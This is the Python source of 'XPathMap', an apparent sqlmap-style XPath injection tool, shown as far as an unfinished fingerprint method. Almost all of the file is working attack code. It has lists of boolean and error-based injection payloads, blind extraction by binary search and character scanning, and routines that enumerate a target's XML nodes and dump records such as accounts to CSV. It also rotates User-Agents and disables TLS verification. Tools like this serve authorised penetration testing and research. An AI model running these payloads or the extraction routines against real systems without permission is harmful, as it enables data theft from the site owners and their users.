#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XPathMap - XPath Injection Testing Tool
Syntax compatible with SQLMap
Author: Security Research Tool
"""

import argparse
import requests
import string
import sys
import time
import re
import random
import json
import os
import csv
import hashlib
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Back, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

VERSION = "1.0-dev"

BANNER = r"""
__  ___  ___      __  __  __  __
\ \/ / |/ / |    / / / /_/ /_/ /  ____ ___  ____ _____
 \  /|   /| | /| / / / __/ __/ __ \/ __ `__ \/ __ `/ __ \
 / //   | | |/ |/ / / /_/ /_/ / / / / / / / / /_/ / /_/ /
/_//_/|_| |__/|__/_/\__/\__/_/ /_/_/ /_/ /_/\__,_/ .___/
                                                  /_/
"""

BANNER2 = f"""
{Fore.RED}        ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
        ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
         ╚███╔╝ ██████╔╝███████║   ██║   ███████║██╔████╔██║███████║██████╔╝
         ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
        ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
        ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
        {Fore.YELLOW}XPathMap v{VERSION}{Style.RESET_ALL} - {Fore.CYAN}XPath Injection Testing Tool{Style.RESET_ALL}
        {Fore.WHITE}[*] Syntax compatible with SQLMap{Style.RESET_ALL}
        {Fore.WHITE}[*] Techniques: Boolean-blind | Error-based | Time-based{Style.RESET_ALL}
        {Fore.WHITE}[*] By {Fore.BLUE}\U0001f47e avdev{Style.RESET_ALL}
"""

# ─── XPath error patterns for multiple frameworks ───────────────────────────
XPATH_ERROR_PATTERNS = [
    r"XPathException", r"XPath.*[Ee]rror", r"[Ee]rror.*XPath",
    r"javax\.xml\.xpath", r"org\.apache\.xpath", r"com\.sun\.org\.apache\.xpath",
    r"System\.Xml\.XPath", r"SimpleXMLElement::xpath",
    r"Warning.*xpath", r"xpath.*warning",
    r"Unterminated string literal", r"Invalid predicate",
    r"Expected token.*", r"XPATH syntax error",
    r"XSLTProcessor", r"DOMXPath",
    r"libxml2", r"xmlXPathEval",
    r"XPath.*compilation.*failed", r"XPath.*parse.*error",
    r"Invalid expression", r"Undefined namespace prefix",
    r"XPathResult", r"INVALID_EXPRESSION_ERR",
    r"net\.sf\.saxon", r"saxon.*XPath",
    r"msxml.*XPath", r"MSXML.*XPathException",
]

# ─── Boolean-based detection payload pairs (true_payload, false_payload) ────
BOOL_DETECT_PAYLOADS = [
    ("' or '1'='1",                "' or '1'='2"),
    ('" or "1"="1',                '" or "1"="2'),
    ("' or 1=1 and '1'='1",       "' or 1=2 and '1'='1"),
    ("') or ('1'='1",              "') or ('1'='2"),
    ('") or ("1"="1',              '") or ("1"="2'),
    ("' or string-length('')=0 or '", "' or string-length('')=1 or '"),
    ("' or contains('abc','a') or '", "' or contains('abc','z') or '"),
    ("' or position()=1 or '",    "' or position()=99999 or '"),
]

# ─── Error-based detection payloads ──────────────────────────────────────────
ERROR_DETECT_PAYLOADS = [
    "'", '"', "']", '"]',
    "' or ''='", '" or ""="',
    "'/*", "' and /*",
    "' or name()='", "' or local-name()='",
    "[", "]", "//",
    "' or count(/)>0 or '",
]

# ─── Characters to try during blind extraction ───────────────────────────────
CHARSET_ALPHA   = string.ascii_lowercase
CHARSET_UPPER   = string.ascii_uppercase
CHARSET_DIGITS  = string.digits
CHARSET_SPECIAL = "_.-@ /#&+:=!?$%^*(){}[]<>|\\~`"
CHARSET_FULL    = CHARSET_ALPHA + CHARSET_UPPER + CHARSET_DIGITS + CHARSET_SPECIAL

# ─── Random User-Agents ───────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
]


class SessionCache:
    """
    Persistent cache for extracted XPath values.
    Stored at ~/.xpathmap/output/<target_hash>/session.json

    Cache key = SHA1( url + param_name + xpath_expression )
    Value      = extracted string

    On re-run, _extract_string() checks the cache first and skips
    the blind extraction if the value is already known — exactly like
    SQLMap's session files.
    """

    def __init__(self, url, param_name, output_dir=None, flush=False):
        host = urlparse(url).netloc.replace(":", "_").replace("/", "_") or "unknown"
        if output_dir:
            base = os.path.expanduser(output_dir)
        else:
            base = os.path.expanduser(f"~/.xpathmap/output/{host}")

        os.makedirs(base, exist_ok=True)
        self.base       = base
        self.cache_file = os.path.join(base, "session.json")
        self._data: dict = {}

        if flush:
            self._save()   # write empty file
        elif os.path.exists(self.cache_file):
            try:
                with open(self.cache_file, "r") as f:
                    self._data = json.load(f)
            except Exception:
                self._data = {}

    def _key(self, url, param, xpath_expr):
        raw = f"{url}|{param}|{xpath_expr}"
        return hashlib.sha1(raw.encode()).hexdigest()

    def get(self, url, param, xpath_expr):
        """Return cached value or None."""
        return self._data.get(self._key(url, param, xpath_expr))

    def set(self, url, param, xpath_expr, value):
        """Store a value and persist immediately."""
        self._data[self._key(url, param, xpath_expr)] = value
        self._save()

    def _save(self):
        with open(self.cache_file, "w") as f:
            json.dump(self._data, f, indent=2)

    @property
    def path(self):
        return self.base


def parse_raw_request(filepath):
    """
    Parse a raw HTTP request file (Burp Suite / curl --dump-header format).

    Supported format:
        POST /path?q=1 HTTP/1.1
        Host: example.com
        Content-Type: application/x-www-form-urlencoded
        Cookie: session=abc

        user=test&pass=x

    Returns dict with keys: method, url, headers, body
    """
    try:
        with open(filepath, "r", errors="replace") as fh:
            raw = fh.read()
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Request file not found: {filepath}{Style.RESET_ALL}")
        sys.exit(1)

    # Split head and optional body on first blank line
    if "\r\n\r\n" in raw:
        head_part, body = raw.split("\r\n\r\n", 1)
        lines = head_part.split("\r\n")
    elif "\n\n" in raw:
        head_part, body = raw.split("\n\n", 1)
        lines = head_part.split("\n")
    else:
        lines = raw.splitlines()
        body  = ""

    if not lines:
        print(f"{Fore.RED}[-] Request file is empty or malformed.{Style.RESET_ALL}")
        sys.exit(1)

    # First line: METHOD /path HTTP/x.x
    request_line = lines[0].strip()
    parts = request_line.split()
    if len(parts) < 2:
        print(f"{Fore.RED}[-] Bad request line: {request_line!r}{Style.RESET_ALL}")
        sys.exit(1)

    method = parts[0].upper()
    path   = parts[1]           # may include query string

    # Parse headers
    headers = {}
    host    = None
    for line in lines[1:]:
        line = line.strip()
        if not line:
            break
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()
            if k.strip().lower() == "host":
                host = v.strip()

    if not host:
        print(f"{Fore.RED}[-] No Host header found in request file.{Style.RESET_ALL}")
        sys.exit(1)

    # Determine scheme — default https if port 443 or no port info, else http
    scheme = "https" if ":443" in host else "http"
    url    = f"{scheme}://{host}{path}"

    body = body.strip() or None

    return {
        "method":  method,
        "url":     url,
        "headers": headers,
        "body":    body,
    }


class XPathMap:
    def __init__(self, args):
        self.args      = args

        # ── -r (raw request file) takes priority over -u ─────────────────────
        if getattr(args, "request_file", None):
            parsed_req     = parse_raw_request(args.request_file)
            self.url       = parsed_req["url"].rstrip("/")
            self.data      = parsed_req["body"] or args.data
            self._raw_headers = parsed_req["headers"]
            self._raw_method  = parsed_req["method"]
        else:
            self.url          = args.url.rstrip("/")
            self.data         = args.data
            self._raw_headers = {}
            self._raw_method  = "GET" if not args.data else "POST"

        self.timeout   = args.timeout
        self.delay     = args.delay
        self.level     = args.level
        self.risk      = args.risk
        self.verbosity = args.verbose
        self.batch     = args.batch
        self.technique = (args.technique or "BET").upper()
        self.prefix    = args.prefix or ""
        self.suffix    = args.suffix or ""

        self.session           = requests.Session()
        self.baseline_resp     = None
        self.true_indicator    = None   # size or string that = True
        self.false_indicator   = None
        self.inject_type       = None
        self.injectable_params = []
        self.params            = []

        # Session cache (persists extracted values across runs)
        flush = getattr(args, "flush_session", False)
        self.cache = SessionCache(
            url        = self.url,
            param_name = getattr(args, "param", None) or "",
            output_dir = getattr(args, "output_dir", None),
            flush      = flush,
        )
        self._log_output_dir()

        # Build headers: raw file headers first, then CLI overrides
        self.headers = {"Accept": "*/*"}
        for k, v in self._raw_headers.items():
            # Skip Host — requests sets it automatically from URL
            if k.lower() != "host":
                self.headers[k] = v

        if args.user_agent:
            self.headers["User-Agent"] = args.user_agent
        elif args.random_agent:
            self.headers["User-Agent"] = random.choice(USER_AGENTS)
        elif "User-Agent" not in self.headers:
            self.headers["User-Agent"] = f"XPathMap/{VERSION}"

        # CLI --cookie overrides file cookie
        if args.cookie:
            self.headers["Cookie"] = args.cookie

        if args.headers:
            for line in args.headers.split("\\n"):
                line = line.strip()
                if ":" in line:
                    k, v = line.split(":", 1)
                    self.headers[k.strip()] = v.strip()

        self.proxy = None
        if args.proxy:
            self.proxy = {"http": args.proxy, "https": args.proxy}

        self._parse_params()

    # ─────────────────────────── helpers ────────────────────────────────────

    def _parse_params(self):
        parsed = urlparse(self.url)
        for k, vs in parse_qs(parsed.query, keep_blank_values=True).items():
            self.params.append({"name": k, "value": vs[0], "loc": "GET"})

        if self.data:
            try:
                jd = json.loads(self.data)
                for k, v in jd.items():
                    self.params.append({"name": k, "value": str(v), "loc": "JSON"})
            except Exception:
                for k, vs in parse_qs(self.data, keep_blank_values=True).items():
                    self.params.append({"name": k, "value": vs[0], "loc": "POST"})

        if self.args.param:
            wanted = [p.strip() for p in self.args.param.split(",")]
            self.params = [p for p in self.params if p["name"] in wanted]

    def _inject_value(self, param, payload):
        """Return the full injected value string."""
        return self.prefix + param["value"] + payload + self.suffix

    def _send(self, param, payload):
        """Send request with injected payload; return response or None."""
        injected = self._inject_value(param, payload)
        parsed   = urlparse(self.url)

        try:
            if param["loc"] == "GET":
                qparams = parse_qs(parsed.query, keep_blank_values=True)
                qparams[param["name"]] = [injected]
                new_url = urlunparse(parsed._replace(query=urlencode(qparams, doseq=True)))
                # If raw request was POST but param is in URL, honour original method
                if self._raw_method == "POST" and self.data:
                    r = self.session.post(new_url, data=self.data,
                                          headers=self.headers, timeout=self.timeout,
                                          proxies=self.proxy, verify=False,
                                          allow_redirects=True)
                else:
                    r = self.session.get(new_url, headers=self.headers,
                                         timeout=self.timeout, proxies=self.proxy,
                                         verify=False, allow_redirects=True)
            elif param["loc"] == "POST":
                pparams = parse_qs(self.data or "", keep_blank_values=True)
                pparams[param["name"]] = [injected]
                r = self.session.post(self.url, data=urlencode(pparams, doseq=True),
                                      headers=self.headers, timeout=self.timeout,
                                      proxies=self.proxy, verify=False, allow_redirects=True)
            elif param["loc"] == "JSON":
                try:
                    jd = json.loads(self.data)
                except Exception:
                    jd = {}
                jd[param["name"]] = injected
                r = self.session.post(self.url, json=jd, headers=self.headers,
                                      timeout=self.timeout, proxies=self.proxy,
                                      verify=False, allow_redirects=True)
            else:
                return None

            if self.delay:
                time.sleep(self.delay)
            return r
        except requests.exceptions.RequestException as e:
            if self.verbosity >= 3:
                self._log(3, f"Request error: {e}")
            return None

    def _send_raw(self):
        """Send request without injection."""
        try:
            if self.data:
                return self.session.post(self.url, data=self.data, headers=self.headers,
                                         timeout=self.timeout, proxies=self.proxy,
                                         verify=False, allow_redirects=True)
            return self.session.get(self.url, headers=self.headers, timeout=self.timeout,
                                    proxies=self.proxy, verify=False, allow_redirects=True)
        except Exception:
            return None

    def _log(self, level, msg, color=Fore.WHITE):
        """0=info, 1=good, 2=warn, 3=debug"""
        if level == 3 and self.verbosity < 3:
            return
        if level == 2 and self.verbosity < 2 and level != 2:
            return
        icons = {0: f"{Fore.CYAN}[*]", 1: f"{Fore.GREEN}[+]",
                 2: f"{Fore.YELLOW}[!]", 3: f"{Fore.WHITE}[DEBUG]"}
        icon = icons.get(level, "[*]")
        print(f"{icon}{Style.RESET_ALL} {color}{msg}{Style.RESET_ALL}")

    def _log_output_dir(self):
        pass  # called after cache is set up — printed in run() once URL is confirmed

    def _is_true(self, resp):
        """Decide if a response represents a True XPath condition."""
        if resp is None:
            return False

        # String-based matching (--string / --not-string)
        if self.args.string:
            return self.args.string in resp.text
        if self.args.not_string:
            return self.args.not_string not in resp.text
        if self.args.code:
            return resp.status_code == self.args.code

        # Size-based (calibrated)
        if self.true_indicator is not None and self.false_indicator is not None:
            size = len(resp.text)
            return abs(size - self.true_indicator) < abs(size - self.false_indicator)

        # Fallback: compare with baseline using 15% threshold
        if self.baseline_resp:
            base = len(self.baseline_resp.text)
            size = len(resp.text)
            if base == 0:
                return size > 10
            return abs(size - base) / base < 0.15
        return True

    def _calibrate_boolean(self, param):
        """Calibrate True/False response indicators for blind extraction."""
        if self.true_indicator is not None:
            return  # already calibrated

        self._log(0, "Calibrating boolean response indicators...")
        best_diff = 0

        for t_pl, f_pl in BOOL_DETECT_PAYLOADS:
            rt = self._send(param, t_pl)
            rf = self._send(param, f_pl)
            if rt is None or rf is None:
                continue
            ts, fs = len(rt.text), len(rf.text)
            diff = abs(ts - fs)
            if diff > best_diff:
                best_diff = diff
                self.true_indicator  = ts
                self.false_indicator = fs
                self._log(2, f"Calibration: TRUE={ts} FALSE={fs} diff={diff}")

        if self.true_indicator is None:
            self._log(2, "Could not calibrate — falling back to baseline comparison")
        else:
            self._log(1, f"Boolean calibrated: TRUE~{self.true_indicator} "
                         f"FALSE~{self.false_indicator}")

    def _check_xpath_error(self, text):
        for pat in XPATH_ERROR_PATTERNS:
            if re.search(pat, text, re.IGNORECASE):
                return True
        return False

    # ─────────────────────────── detection ──────────────────────────────────

    def detect(self, param):
        """Return injection type: 'boolean', 'error', 'time', or None."""
        self._log(0, f"Testing parameter '{param['name']}' ({param['loc']})...")

        # ── Error-based ──────────────────────────────────────────────────────
        if "E" in self.technique:
            for pl in ERROR_DETECT_PAYLOADS:
                r = self._send(param, pl)
                if r and self._check_xpath_error(r.text):
                    self._log(1, f"Error-based XPath injection confirmed!", Fore.GREEN)
                    self._log(2, f"Error payload: {pl!r}")
                    return "error"

        # ── Boolean-based ────────────────────────────────────────────────────
        if "B" in self.technique:
            for t_pl, f_pl in BOOL_DETECT_PAYLOADS:
                r_true  = self._send(param, t_pl)
                r_false = self._send(param, f_pl)
                if r_true is None or r_false is None:
                    continue

                t_size = len(r_true.text)
                f_size = len(r_false.text)
                b_size = len(self.baseline_resp.text) if self.baseline_resp else 0

                self._log(3, f"TRUE={t_size} FALSE={f_size} BASE={b_size} payload={t_pl!r}")

                diff = abs(t_size - f_size)
                if diff > 5:
                    self.true_indicator  = t_size
                    self.false_indicator = f_size
                    self._log(1, f"Boolean-based blind XPath injection confirmed!", Fore.GREEN)
                    self._log(1, f"TRUE size={t_size}, FALSE size={f_size}, diff={diff}")
                    return "boolean"

        # ── Time-based ───────────────────────────────────────────────────────
        if "T" in self.technique:
            result = self._detect_time(param)
            if result:
                return "time"

        return None

    def _detect_time(self, param):
        # Measure baseline
        times = []
        for _ in range(3):
            t0 = time.time()
            self._send_raw()
            times.append(time.time() - t0)
        baseline = sum(times) / len(times)
        self._log(3, f"Baseline avg response time: {baseline:.3f}s")

        # Try heavy recursive XPath to cause measurable delay in slow parsers
        heavy_payloads = [
            f"' or (count(//*[string-length(name())>{self.args.time_sec*0}])>{self.args.time_sec*0}) or '",
        ]
        for pl in heavy_payloads:
            t0 = time.time()
            self._send(param, pl)
            elapsed = time.time() - t0
            self._log(3, f"Time-based payload elapsed: {elapsed:.3f}s")
            if elapsed > baseline + self.args.time_sec:
                self._log(1, f"Time-based XPath injection detected! Elapsed={elapsed:.2f}s")
                return True
        return False

    # ─────────────────────────── blind extraction ───────────────────────────

    def _ask_bool(self, param, xpath_cond):
        """Send boolean XPath condition, return True/False."""
        # Wrap in a safe OR clause
        payload = f"' or ({xpath_cond}) and '1'='1"
        r = self._send(param, payload)
        result = self._is_true(r)
        self._log(3, f"BOOL {xpath_cond!r} → {result}")
        return result

    def _extract_int_bsearch(self, param, xpath_expr, lo=0, hi=512):
        """Binary search for integer XPath expression."""
        for _ in range(20):
            if lo >= hi:
                break
            mid = (lo + hi) // 2
            if self._ask_bool(param, f"({xpath_expr}) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _extract_char_bsearch(self, param, xpath_char_expr):
        """Binary-search the ASCII value of a single XPath char expression."""
        lo, hi = 32, 127
        for _ in range(8):
            if lo >= hi:
                break
            mid = (lo + hi) // 2
            if self._ask_bool(param, f"string-to-codepoints({xpath_char_expr}) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo < 127 else None

    def _extract_char_linear(self, param, xpath_char_expr):
        """Linear scan for a single char — faster for short alphabets."""
        for ch in CHARSET_FULL:
            if self._ask_bool(param, f"substring({xpath_char_expr},1,1)='{ch}'"):
                return ch
        return "?"

    def _extract_string(self, param, xpath_expr, max_len=256, label=""):
        """Extract full string from XPath expression via boolean blind.
        Checks session cache first — if already extracted, returns instantly."""

        # ── Cache lookup ─────────────────────────────────────────────────────
        cached = self.cache.get(self.url, param["name"], xpath_expr)
        if cached is not None:
            sys.stdout.write(
                f"\r{Fore.CYAN}[*]{Style.RESET_ALL} {label or 'value'}: "
                f"{Fore.GREEN}{cached}{Style.RESET_ALL} {Fore.WHITE}[cached]{Style.RESET_ALL}\n"
            )
            sys.stdout.flush()
            return cached

        # ── Live extraction ──────────────────────────────────────────────────
        length = self._extract_int_bsearch(param,
                    f"string-length(string({xpath_expr}))", 0, max_len)

        if self.verbosity >= 2:
            self._log(2, f"String length of {label or xpath_expr}: {length}")

        result = ""
        for i in range(1, length + 1):
            ch = self._extract_char_linear(param,
                    f"substring(string({xpath_expr}),{i},1)")
            result += ch
            sys.stdout.write(
                f"\r{Fore.CYAN}[*]{Style.RESET_ALL} {label or 'value'}: "
                f"{Fore.YELLOW}{result}{Style.RESET_ALL}{'  '}"
            )
            sys.stdout.flush()

        if length > 0:
            print()

        # ── Save to cache ────────────────────────────────────────────────────
        self.cache.set(self.url, param["name"], xpath_expr, result)
        return result

    # ─────────────────────────── enumeration ────────────────────────────────

    def get_dbs(self, param):
        """Enumerate root XML nodes (analogous to databases)."""
        print(f"\n{Fore.CYAN}[*] Enumerating root XML nodes (--dbs){Style.RESET_ALL}")
        count = self._extract_int_bsearch(param, "count(/*)", 0, 20)
        self._log(1, f"Root node count: {count}")

        nodes = []
        for i in range(1, count + 1):
            name = self._extract_string(param, f"name(/*[{i}])", label=f"root[{i}]")
            if name:
                nodes.append(name)
                print(f"  {Fore.GREEN}[{i}] {name}{Style.RESET_ALL}")
        return nodes

    def get_tables(self, param):
        """Enumerate child XML nodes under a root node (analogous to tables)."""
        db = self.args.D
        if not db:
            db = self._get_default_db(param)
            if not db:
                self._log(2, "Could not determine root node. Use -D <node>")
                return []

        print(f"\n{Fore.CYAN}[*] Enumerating child nodes of '{db}' (--tables){Style.RESET_ALL}")
        count = self._extract_int_bsearch(param, f"count(/{db}/*[not(self::*=preceding::*)])", 0, 50)
        # Simpler: count total children of first root match
        count = self._extract_int_bsearch(param, f"count(/{db}/*)", 0, 200)
        self._log(1, f"Child node instances: {count}")

        # Get unique names
        seen   = {}
        tables = []
        for i in range(1, min(count + 1, 50)):
            name = self._extract_string(param, f"name(/{db}/*[{i}])", label=f"{db}[{i}]")
            if name and name not in seen:
                seen[name] = True
                tables.append(name)
                print(f"  {Fore.GREEN}• {name}{Style.RESET_ALL}")
        return tables

    def _resolve_record_path(self, param, db, table):
        """
        Determine the XPath template and record count for /{db}/{table}.

        Decision tree:
          A) count(/{db}/{table}) > 1
             → The table-named elements ARE the rows (flat list pattern)
             → template = /{db}/{table}[{i}], count = number of siblings
             Example: <accounts><acc>…</acc><acc>…</acc></accounts>
                      count(/accounts/acc) = 2  →  /accounts/acc[1], /accounts/acc[2]

          B) count(/{db}/{table}) == 1 and it has repeated same-named children
             → Children with the same tag are the rows (container pattern)
             → template = /{db}/{table}/{child}[{i}]
             Example: <store><users><user>…</user><user>…</user></users></store>
                      count(/store/users) = 1, count(/store/users/user) = 3
                      → /store/users/user[1..3]

          C) Fallback → treat the single node as one record
        """
        # ── Step 1: count how many /{db}/{table} elements exist ──────────────
        table_count = self._extract_int_bsearch(param,
                          f"count(/{db}/{table})", 0, 300)

        if table_count > 1:
            # Case A: flat list — the repeated elements are the rows
            self._log(1, f"Flat-list pattern: {table_count} × <{table}> elements")
            return f"/{db}/{table}[{{i}}]", table_count

        # ── Step 2: look at children of the single /{db}/{table} ─────────────
        child_count = self._extract_int_bsearch(param,
                          f"count(/{db}/{table}/*)", 0, 500)

        if child_count > 0:
            # Get the first child's tag name
            first_child = self._extract_string(param,
                              f"name(/{db}/{table}/*[1])",
                              label="record-tag")
            if first_child:
                # Count how many siblings share that tag (= number of rows)
                row_count = self._extract_int_bsearch(param,
                                f"count(/{db}/{table}/{first_child})", 0, 300)
                if row_count > 1:
                    # Case B: container pattern
                    self._log(1, f"Container pattern: {row_count} × <{first_child}> rows")
                    return f"/{db}/{table}/{first_child}[{{i}}]", row_count
                if row_count == 1:
                    # Single child with that tag — check if its children are rows
                    inner_count = self._extract_int_bsearch(param,
                                      f"count(/{db}/{table}/{first_child}/*)", 0, 300)
                    if inner_count > 0:
                        inner_tag = self._extract_string(param,
                                        f"name(/{db}/{table}/{first_child}/*[1])",
                                        label="inner-tag")
                        if inner_tag:
                            inner_row_count = self._extract_int_bsearch(param,
                                                 f"count(/{db}/{table}/{first_child}/{inner_tag})",
                                                 0, 300)
                            self._log(1, f"Nested pattern: {inner_row_count} × <{inner_tag}> rows")
                            return f"/{db}/{table}/{first_child}/{inner_tag}[{{i}}]", inner_row_count

            # Fallback: positional children
            return f"/{db}/{table}/*[{{i}}]", child_count

        # ── Case C: single leaf node ─────────────────────────────────────────
        return f"/{db}/{table}[{{i}}]", max(table_count, 1)

    def get_columns(self, param):
        """Enumerate attributes and child elements (analogous to columns)."""
        db    = self.args.D
        table = self.args.T
        if not db:
            db = self._get_default_db(param)
        if not table:
            self._log(2, "Specify table with -T <node>")
            return []

        print(f"\n{Fore.CYAN}[*] Enumerating columns of '{db}/{table}'{Style.RESET_ALL}")

        rec_tpl, total = self._resolve_record_path(param, db, table)
        self._log(1, f"Record XPath: {rec_tpl.format(i='N')}  (total={total})")

        rec1 = rec_tpl.format(i=1)
        columns = []

        # Attributes of first record
        attr_count = self._extract_int_bsearch(param, f"count({rec1}/@*)", 0, 30)
        self._log(1, f"Attribute count: {attr_count}")
        for i in range(1, attr_count + 1):
            aname = self._extract_string(param, f"name({rec1}/@*[{i}])",
                                         label=f"attr[{i}]")
            if aname:
                columns.append(f"@{aname}")
                print(f"  {Fore.GREEN}@{aname}{Style.RESET_ALL} {Fore.WHITE}(attribute){Style.RESET_ALL}")

        # Child elements of first record
        child_count = self._extract_int_bsearch(param, f"count({rec1}/*)", 0, 30)
        self._log(1, f"Child element count: {child_count}")
        seen = {}
        for i in range(1, min(child_count + 1, 30)):
            ename = self._extract_string(param, f"name({rec1}/*[{i}])",
                                         label=f"elem[{i}]")
            if ename and ename not in seen:
                seen[ename] = True
                columns.append(ename)
                print(f"  {Fore.GREEN}{ename}{Style.RESET_ALL} {Fore.WHITE}(element){Style.RESET_ALL}")

        return columns

    def dump(self, param):
        """Dump data records from a node."""
        db    = self.args.D
        table = self.args.T
        if not db:
            db = self._get_default_db(param)
        if not table:
            self._log(2, "Specify target node with -T <node>. Use --tables first.")
            return []

        cols_arg = [c.strip() for c in self.args.C.split(",")] if self.args.C else None

        print(f"\n{Fore.CYAN}[*] Dumping '{db}/{table}'{Style.RESET_ALL}")

        rec_tpl, total = self._resolve_record_path(param, db, table)
        self._log(1, f"Record path: {rec_tpl.format(i='N')}  total={total}")

        start_idx = self.args.start if self.args.start else 1
        stop_idx  = min(self.args.stop, total) if self.args.stop else total

        rows = []
        for i in range(start_idx, stop_idx + 1):
            row  = {}
            rec  = rec_tpl.format(i=i)
            print(f"\n{Fore.YELLOW}  ┌── Record {i}/{total} ──{Style.RESET_ALL}")

            if cols_arg:
                targets = cols_arg
            else:
                # Auto-detect attributes
                ac = self._extract_int_bsearch(param, f"count({rec}/@*)", 0, 20)
                targets = []
                for j in range(1, ac + 1):
                    an = self._extract_string(param, f"name({rec}/@*[{j}])",
                                              label=f"attr[{j}]")
                    if an:
                        targets.append(f"@{an}")

                # Auto-detect child elements (unique names)
                cc = self._extract_int_bsearch(param, f"count({rec}/*)", 0, 20)
                seen_e = {}
                for j in range(1, cc + 1):
                    en = self._extract_string(param, f"name({rec}/*[{j}])",
                                              label=f"elem[{j}]")
                    if en and en not in seen_e:
                        seen_e[en] = True
                        targets.append(en)

            for col in targets:
                if col.startswith("@"):
                    xpath_val = f"{rec}/@{col[1:]}"
                else:
                    xpath_val = f"string({rec}/{col})"

                val = self._extract_string(param, xpath_val, label=col)
                if val.strip():
                    row[col] = val
                    print(f"  {Fore.CYAN}  │ {col}{Style.RESET_ALL}: "
                          f"{Fore.WHITE}{val}{Style.RESET_ALL}")

            print(f"  {Fore.YELLOW}  └────────────────────────{Style.RESET_ALL}")
            rows.append(row)

            # Write/append row to CSV immediately (so partial dumps are saved)
            self._write_csv(db, table, row, write_header=(i == start_idx))

        return rows

    def _write_csv(self, db, table, row, write_header=False):
        """Append a single record row to <output_dir>/<db>_<table>.csv"""
        if not row:
            return
        safe_db    = re.sub(r"[^\w\-]", "_", db)
        safe_table = re.sub(r"[^\w\-]", "_", table)
        csv_path   = os.path.join(self.cache.path, f"{safe_db}_{safe_table}.csv")
        mode       = "w" if write_header else "a"
        try:
            with open(csv_path, mode, newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=list(row.keys()))
                if write_header or os.path.getsize(csv_path) == 0:
                    writer.writeheader()
                writer.writerow(row)
        except Exception as e:
            self._log(2, f"CSV write error: {e}")

    def dump_all(self, param):
        """Enumerate everything and dump all data. Returns list of (db, table, rows)."""
        collected = []
        dbs = self.get_dbs(param)
        for db in dbs:
            self.args.D = db
            tables = self.get_tables(param)
            for tbl in tables:
                self.args.T = tbl
                rows = self.dump(param)
                if rows:
                    collected.append((db, tbl, rows))
        return collected

    def _get_default_db(self, param):
        name = self._extract_string(param, "name(/*[1])", label="root[1]")
        return name if name else None

    # ─────────────────────────── summary / table renderer ───────────────────

    def _render_table(self, headers, rows):
        """
        Render a list-of-dicts as a bordered ASCII table (SQLMap style).
        Returns a list of printable lines.
        """
        # Compute column widths
        widths = {h: len(h) for h in headers}
        for row in rows:
            for h in headers:
                widths[h] = max(widths[h], len(str(row.get(h, ""))))

        sep = "+" + "+".join("-" * (widths[h] + 2) for h in headers) + "+"
        hdr = "|" + "|".join(
            f" {Fore.CYAN}{h.center(widths[h])}{Style.RESET_ALL} " for h in headers
        ) + "|"

        lines = [sep, hdr, sep]
        for row in rows:
            line = "|"
            for h in headers:
                val = str(row.get(h, ""))
                line += f" {Fore.WHITE}{val.ljust(widths[h])}{Style.RESET_ALL} |"
            lines.append(line)
        lines.append(sep)
        return lines

    def _print_final_summary(self, dumped_tables):
        """
        Print SQLMap-style final summary:
          - ASCII table for each dumped (db, table)
          - Saved CSV path for each
        """
        print(f"\n{Fore.YELLOW}{'═' * 60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  DUMP SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'═' * 60}{Style.RESET_ALL}")

        saved_files = []

        for db, table, rows in dumped_tables:
            if not rows:
                continue

            # Collect all column names preserving order
            headers = []
            seen_h  = set()
            for row in rows:
                for k in row.keys():
                    if k not in seen_h:
                        headers.append(k)
                        seen_h.add(k)

            rec_word = "record" if len(rows) == 1 else "records"
            print(f"\n{Fore.GREEN}[+] Table: {Fore.YELLOW}{db}/{table}{Style.RESET_ALL}"
                  f"  ({Fore.WHITE}{len(rows)} {rec_word}{Style.RESET_ALL})")

            for line in self._render_table(headers, rows):
                print("  " + line)

            # CSV path
            safe_db    = re.sub(r"[^\w\-]", "_", db)
            safe_table = re.sub(r"[^\w\-]", "_", table)
            csv_path   = os.path.join(self.cache.path, f"{safe_db}_{safe_table}.csv")
            saved_files.append(csv_path)
            print(f"\n  {Fore.CYAN}[*] Saved to:{Style.RESET_ALL} "
                  f"{Fore.YELLOW}{csv_path}{Style.RESET_ALL}")

        # Footer
        print(f"\n{Fore.YELLOW}{'═' * 60}{Style.RESET_ALL}")
        if saved_files:
            print(f"{Fore.GREEN}[+] {len(saved_files)} table(s) saved as CSV:{Style.RESET_ALL}")
            for p in saved_files:
                print(f"    {Fore.YELLOW}{p}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'═' * 60}{Style.RESET_ALL}\n")

    # ─────────────────────────── fingerprint ────────────────────────────────

    def fingerprint(self, param):
        """Try to identify XPath engine/environment."""
